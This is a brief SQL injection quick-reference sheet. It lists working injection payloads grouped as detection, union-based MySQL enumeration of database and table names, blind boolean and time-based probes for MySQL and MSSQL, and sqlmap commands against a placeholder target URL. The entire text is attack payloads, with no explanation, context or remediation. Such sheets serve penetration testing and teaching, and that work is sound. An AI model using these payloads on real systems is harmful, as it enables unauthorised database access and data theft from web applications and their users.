# SQLi Quick Reference

## Detection
```sql
'
''
')
' OR '1'='1
' OR 1=1--
" OR 1=1--
```

## Union-based (MySQL)
```sql
' ORDER BY 3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

## Blind Boolean
```sql
' AND 1=1--
' AND 1=2--
' AND SUBSTRING(database(),1,1)='a'--
```

## Time-based
```sql
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--   (MSSQL)
```

## Automation
```bash
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
```
